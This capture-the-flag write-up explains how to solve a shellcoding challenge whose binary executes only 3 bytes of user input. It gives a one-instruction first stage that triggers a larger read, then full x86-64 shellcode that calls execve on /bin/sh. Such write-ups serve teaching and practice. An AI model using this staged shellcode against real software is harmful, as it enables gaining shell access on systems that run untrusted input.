# Gimme3bytes

**Category:** Shellcoding

## Overview

```text
  v3 = mmap(nullptr, 0x1000u, 7, 34, -1, 0);
  read(0, v3, 3u);
  ((void (*)(void))v3)();
  return 0;
```
As we can see from the read, it only reads 3 bytes.

## Analysis

We do not have enough space to directly perform the execve on /bin/sh\0.
The solution is to use this limited shellcode to perform a read of bigger size.
If we analyze the state of the registers before the execution, we can see that they are already set to perform a read of sufficient size to get a shell.


## Vulnerability
Classic shellcode vulnerability, the input of the user gets executed.


## Exploitation
The first shellcode is just a syscall to perform the read:
```text
syscall
```

Now we do not have constraints for the second shellcode thanks to the first read:

```text
nop
nop     the nop sled is used to overwrite the instructions of the first shellcode -> one nop for every byte of the previous shellcode
mov rdi, 0x0068732f6e69622f     /bin/sh\0
push rdi
mov rdi, rsp
xor rax, rax
xor rsi, rsi
xor rdx, rdx
mov al, 0x3b
syscall     execve syscall
```

The second shellcode simply calls an execve on /bin/sh\0